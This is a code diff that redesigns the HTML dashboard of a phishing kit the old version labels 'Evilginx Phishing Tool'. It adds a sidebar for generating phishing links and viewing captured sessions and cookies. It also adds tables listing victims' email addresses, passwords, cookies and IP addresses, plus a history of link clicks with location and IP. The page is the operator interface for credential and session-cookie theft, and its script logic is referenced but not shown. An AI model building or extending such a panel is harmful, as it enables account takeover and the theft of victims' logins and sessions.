@@ -6,25 +6,45 @@
     <title>Dashboard</title>
     <link rel="stylesheet" href="styles.css">
 </head>
-<body onload="checkAuthStatus()">
-    <h1>Welcome to Your Dashboard</h1>
-    <button onclick="logout()">Logout</button>
+<body class="dashboard-body">
+    <div class="sidebar">
+        <h2>Menu</h2>
+        <button class="menu-btn" onclick="generateLink()">Generate Link</button>
+        <button class="menu-btn" onclick="fetchCapturedSessions()">Captured Sessions</button>
+        <button class="menu-btn" onclick="fetchCookies()">Cookies</button>
+        <button class="menu-btn logout-btn" onclick="logout()">Logout</button>
+    </div>
 
-    <h2>Evilginx Phishing Tool</h2>
-    <button onclick="generateLink()">Generate Link</button>
-    <p id="generated-link"></p>
+    <div class="main-content">
+        <h2>Dashboard</h2>
+        <div id="generated-link"></div>
+        
+        <h3>Captured Sessions</h3>
+        <table id="captured-sessions">
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Cookies</th>
+                    <th>IP</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
 
-    <button onclick="getCapturedSessions()">View Captured Sessions</button>
-    <pre id="captured-sessions"></pre>
-
-    <button onclick="getCookies()">View Captured Cookies</button>
-    <pre id="cookies-data"></pre>
-
-    <!-- ✅ Load Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
-
-    <!-- ✅ Load Firebase Config & Script -->
+        <h3>Generated Links History</h3>
+        <table id="link-history">
+            <thead>
+                <tr>
+                    <th>Generated Link</th>
+                    <th>Location Clicked</th>
+                    <th>IP Address</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+    
     <script src="firebase-config.js"></script>
     <script src="script.js"></script>
 </body>
